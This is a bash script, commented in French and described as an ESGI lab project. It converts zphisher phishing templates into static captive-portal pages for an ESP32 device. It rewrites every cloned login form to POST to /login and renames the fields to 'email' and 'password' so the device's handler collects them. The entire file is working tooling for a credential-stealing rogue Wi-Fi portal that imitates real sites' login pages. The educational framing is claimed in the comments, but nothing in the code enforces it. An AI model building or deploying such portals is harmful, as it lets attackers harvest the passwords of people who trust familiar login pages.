#!/usr/bin/env bash
# zphisher_to_sd.sh — convertit des templates zphisher en portails Axolotl (SD).
#
# Cadre : projet pédagogique ESGI, labo, matériel de l'équipe. L'ESP32 ne fait
# PAS tourner de PHP : il sert le HTML statique et capture le POST sur /login.
# Ce script prend les pages de zphisher et les adapte à ce fonctionnement.
#
# Usage :
#   ./zphisher_to_sd.sh <dir_sites_zphisher> <dir_sortie>
# Exemple :
#   ./zphisher_to_sd.sh ~/zphisher/.sites  /run/media/$USER/AXOLOTL/portals
#
# Chaque site <Nom> devient <sortie>/<nom>/index.html avec :
#   - <form ...> réécrit en  action="/login" method="POST"
#   - les champs renommés en  name="email"  et  name="password"
#     (le handler Rust /login lit exactement ces deux clés).
#
# NB : les assets externes (CSS/JS/images sur CDN) peuvent ne pas charger sur un
# portail captif hors-ligne — l'essentiel (le formulaire de login) fonctionne.
set -euo pipefail

SRC="${1:-}"
OUT="${2:-}"
if [[ -z "$SRC" || -z "$OUT" ]]; then
  echo "usage: $0 <dir_sites_zphisher> <dir_sortie>" >&2
  exit 1
fi
if [[ ! -d "$SRC" ]]; then
  echo "erreur: dossier sources introuvable: $SRC" >&2
  exit 1
fi

mkdir -p "$OUT"
count=0

for site_dir in "$SRC"/*/; do
  [[ -d "$site_dir" ]] || continue
  name="$(basename "$site_dir")"
  # slug minuscule, sans espaces (nom de dossier sur SD)
  slug="$(echo "$name" | tr '[:upper:] ' '[:lower:]-' | tr -cd 'a-z0-9-_')"

  # HTML principal : index.html sinon login.html sinon le premier .html
  html=""
  for cand in index.html login.html; do
    [[ -f "$site_dir/$cand" ]] && { html="$site_dir/$cand"; break; }
  done
  if [[ -z "$html" ]]; then
    html="$(find "$site_dir" -maxdepth 1 -iname '*.html' | head -n1 || true)"
  fi
  if [[ -z "$html" ]]; then
    echo "  skip $name (aucun .html)" >&2
    continue
  fi

  mkdir -p "$OUT/$slug"
  # Réécritures : action du form → /login, méthode → POST, noms de champs → email/password.
  sed -E \
    -e 's#(<form[^>]*\baction=)"[^"]*"#\1"/login"#Ig' \
    -e 's#(<form[^>]*\bmethod=)"[^"]*"#\1"POST"#Ig' \
    -e 's#(name=)"(username|user|login|identifiant|email_or_phone)"#\1"email"#Ig' \
    -e 's#(name=)"(pass|passwd|pwd|motdepasse)"#\1"password"#Ig' \
    "$html" > "$OUT/$slug/index.html"

  # Copie les assets locaux (css/js/images) au cas où ils soient référencés en relatif.
  find "$site_dir" -maxdepth 1 -type f ! -iname '*.php' ! -iname '*.html' \
    -exec cp {} "$OUT/$slug/" \; 2>/dev/null || true

  echo "  ok  $name -> $OUT/$slug/index.html"
  count=$((count+1))
done

echo "Termine : $count portail(s) generes dans $OUT"
echo "Verifie que chaque form a bien name=\"email\" et name=\"password\"."
